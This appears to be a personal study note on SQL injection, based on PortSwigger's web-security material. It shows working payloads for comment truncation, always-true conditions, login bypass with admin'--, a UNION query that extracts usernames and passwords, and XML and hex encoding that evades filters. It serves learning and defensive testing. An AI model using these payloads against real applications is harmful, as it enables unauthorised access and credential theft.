# SQL Injection

Cheat sheet: <https://portswigger.net/web-security/sql-injection/cheat-sheet>

## Basic injection

Given an application that allows user input to select a category:

``` sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

This is exploitable the below input:

``` sql
'--
```

Resulting in a query like:

``` sql
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```

or,

``` sql
SELECT * FROM products WHERE category = 'Gifts'
```

This can return all gifts, whether released is 0 or 1. We can also list all categories using:

``` sql
' OR 1=1--
```

resulting in:

``` sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```

which returns all items.

## Application logic

If an application is vulnerable to SQLi for something like a login workflow, its sometimes possible to login without a passowrd.

Given application logic that does something like:

``` sql
SELECT * FROM users WHERE username = 'admin' AND password = 'adminPassword'
```

then injecting:

``` sql
admin'--
```

results in a query like:

``` sql
SELECT * FROM users WHERE username = 'admin'
```

## Retrieving data in other tables

In an SQLi vulnerable application, utilize UNION in to retrieve data from other tables:

Given:

``` sql
SELECT name, description FROM products WHERE category = 'Gifts'
```

then injecting the following will return all usernames and passwords:

``` sql
' UNION SELECT username, password from users--
```

## Obfuscating injections

To prevent being blocked by validation steps, such as removing the SELECT keyword, its always possible to encode the injection attempt. The below example uses an XML escape sequence to encode the letter `S`:

``` xml
<stockCheck>
    <productId>123</productId>
    <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
</stockCheck>
```

The Hackvertor extension is also useful:

``` xml
<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities></storeId>
```
